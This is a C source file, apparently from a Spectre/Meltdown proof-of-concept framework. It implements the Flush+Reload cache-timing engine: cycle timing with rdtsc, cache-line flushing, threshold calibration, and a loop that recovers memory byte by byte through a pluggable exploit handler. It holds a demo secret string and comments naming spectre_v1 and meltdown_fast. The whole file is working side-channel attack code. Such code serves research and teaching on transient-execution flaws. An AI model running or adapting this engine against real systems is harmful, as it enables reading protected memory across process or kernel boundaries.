#include "tools.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
//#ifdef _MSC_VER
//#include <intrin.h> /* for rdtscp and clflush */
//#pragma optimize("gt",on)
//#else
//#include <x86intrin.h> /* for rdtscp and clflush */
//#endif
//##############################################################
static inline void fence() { __asm__ volatile ("mfence"); }

static inline void maccess(void *p){
  __asm__ volatile("movl (%0) ,%%eax" : : "c"(p):"eax");
}

static inline void flush(void *p){
  __asm__ volatile("clflush 0(%0)" : : "r"(p) : "eax");
}

uint64_t rdtsc(){
  uint64_t a=0;
  __asm__ volatile("mfence");
  __asm__ volatile("rdtsc":"=A"(a));
  __asm__ volatile("mfence");
  return a;
}
//##############################################################
void *(_memset) (void *s,int c,size_t n)
{
    const unsigned char uc = c;
    unsigned char *su;
    for(su = s;0 < n;++su,--n)
        *su = uc;
    return s;
}
//##############################################################
typedef struct {
    int tries;
    int zero;
    int s1;
    int s2;
    uint8_t v1;
    uint8_t v2;
} result_t;

char *secret = "The Magic Words are Squeamish Ossifrage.";

memory_buffer_t buffer = {
    .indices_size = 16,
    .indices = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
};

static size_t detect_flush_reload_threshold(void) {
    size_t reload_time = 0, flush_reload_time = 0, threshold, count = 1000000;
    uint64_t start = 0, end = 0;
    uint8_t dummy[4096];
    uint8_t *ptr = dummy + 2048;
    volatile uint8_t *vptr = ptr; // To avoid optimization
    unsigned int junk = 0;

    junk = *vptr;
    for (int i = 0; i < count; i++) {
        start = rdtsc();
        junk = *vptr;
        end = rdtsc();
        reload_time += (end - start);
    }
    
    for (int i = 0; i < count; i++) {
        flush(ptr);
        start = rdtsc();
        junk = *vptr;
        end = rdtsc();
        flush_reload_time += (end - start);
    }
    reload_time /= count;
    flush_reload_time /= count;

    //printf("Flush+Reload: %zd cycles, Reload only: %zd cycles\n", flush_reload_time, reload_time);
    threshold = (flush_reload_time + reload_time * 2) / 3;
    //printf("Flush+Reload threshold: %zd cycles\n", threshold);
    
    return threshold;
}

static void read_byte(size_t address, result_t *result, int tries, size_t threshold, exploit_handler exploit) {
    unsigned int junk = 0;
    volatile uint8_t *addr;
    int v1 = -1, v2 = -1, v3 = -1;
    int s[256];
    
    _memset(result, 0, sizeof(*result));
    _memset(s, 0, sizeof(s));
    
    for (result->tries = 0; result->tries < tries; result->tries++) {
        size_t exclude_i = exploit(address, result->tries);
        
        // Time reads. Order is slightly mixed up to prevent stride prediction
        for (int i = 0; i < 256; i++) {
            register uint64_t time1, time2;
            int mix_i = ((i * 167) + 13) & 255;
            addr = buffer.table + mix_i * CACHE_PAGE;
            time1 = rdtsc();
            junk = *addr;
            time2 = rdtsc() - time1;
            
            if (time2 <= threshold && mix_i != exclude_i) {
                s[mix_i]++; // Cache hit -> score +1 for this value
            }
            
            flush((void *)addr); // Flush from cache and try next address
        }
        
        // Locate 3 highest bytes
        v1 = v2 = v3 = -1;
        for (int i = 0; i < 256; i++) {
            if (s[i] == 0) {
                continue;
            }
            if (v1 < 0 || s[i] > s[v1]) {
                v3 = v2;
                v2 = v1;
                v1 = i;
            } else if (v2 < 0 || s[i] > s[v2]) {
                v3 = v2;
                v2 = i;
            } else if (v3 < 0 || s[i] > s[v3]) {
                v3 = i;
            }
        }
        
        if (v1 > 0) {
            // First byte has non-zero value
            if (v2 != -1) {
                // Second best byte defined
                if (s[v1] > 2 * s[v2] + 2) {
                    result->tries++;
                    break;
                }
            } else {
                // Only first byte defined
                if (s[v1] > 2) {
                    result->tries++;
                    break;
                }
            }
        } else if (v1 == 0 && v2 != -1) {
            // First byte has zero value & second best byte defined
            // Possible misprediction for spectre_v1 and meltdown_fast
            if (v3 != -1) {
                // Third best byte defined
                if (s[v2] > 2 * s[v3] + 2) {
                    result->tries++;
                    break;
                }
            } else {
                // Third best byte undefined
                if (s[v2] > 2) {
                    result->tries++;
                    break;
                }
            }
        }
    }
    
    if (v1 > 0) {
        // First byte has non-zero value
        result->v1 = (uint8_t)v1;
        result->s1 = s[v1];
        if (v2 != -1) {
            // Second best value defined
            result->v2 = (uint8_t)v2;
            result->s2 = s[v2];
        }
    } else if (v1 == 0) {
        // First byte has zero value
        // Possible misprediction for spectre_v1 and meltdown_fast
        result->zero = s[v1];
        if (v2 != -1) {
            // Second best byte defined
            result->v1 = (uint8_t)v2;
            result->s1 = s[v2];
            if (v3 != -1) {
                // Third best byte defined
                result->v2 = (uint8_t)v3;
                result->s2 = s[v3];
            }
        } else {
            // Zero is the correct value for first byte
            // No misprediction
            result->v1 = (uint8_t)v1;
            result->s1 = s[v1];
        }
    }
}

int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
    //uint8_t *dump = malloc(len);
    /*maccess(&len);
    uint8_t *dump=&len;
    if (dump == NULL) {
        printf("Memory allocation error!\n");
        return 1;
    }
    */
    // Write data to table array to ensure it is memory backed
    _memset(buffer.table, 1, sizeof(buffer.table));
    
    size_t threshold = detect_flush_reload_threshold();
    size_t x = (size_t)addres;
    
    // Flush table[CACHE_PAGE * (0..255)] from cache
    for (int i = 0; i < 256; i++) {
        flush(buffer.table + i * CACHE_PAGE);
    }
    
    //printf("Reading %zd bytes in %d tries:\n", len, tries);
    //printf(" STATUS  1st   SCORE  2nd   SCORE TRIES ZEROS\n");
    
    for (int i = 0; i < len; i++) {
        result_t result;
        
        //printf("%p ", (void *)x);
        read_byte(x++, &result, tries, threshold, exploit);
        
        if (result.s1 > 0) {
            //printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 + 2 ? "Success" : "Unclear"));
            printf("%c  ", (result.v1 >= 0x20 && result.v1 <= 0x7E) ? result.v1 : ' ');
            /*if (result.s2 > 0) {
                printf("0x%02X %c %5d ", result.v2, (result.v2 >= 0x20 && result.v2 <= 0x7E) ? result.v2 : ' ', result.s2);
            } else {
                printf("   -       - ");
            }*/
            //printf("%5d ", result.tries);
            /*if (result.zero > 0) {
                printf("%5d", result.zero);
            } else {
                printf("    -");
            }*/
        } /*else {
            printf("%9s    -       -    -       - %5d     -", "Undefined", result.tries);
        } */
        //printf("\n");
        
        //dump[i] = result.v1;
    }
    
    printf("\n");
    
    
    return 0;
}
